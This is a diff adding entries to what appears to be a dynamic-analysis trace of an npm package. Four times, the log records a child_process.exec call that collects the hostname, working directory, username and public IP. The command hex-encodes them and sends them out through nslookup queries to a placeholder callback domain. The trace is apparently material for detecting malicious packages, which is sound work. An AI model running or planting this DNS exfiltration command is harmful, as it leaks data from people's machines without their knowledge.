@@ -1,0 +1,8 @@
+[child_process.exec] ["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
+[child_process.exec] ["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
+[child_process.exec] ["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
+[child_process.exec] ["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
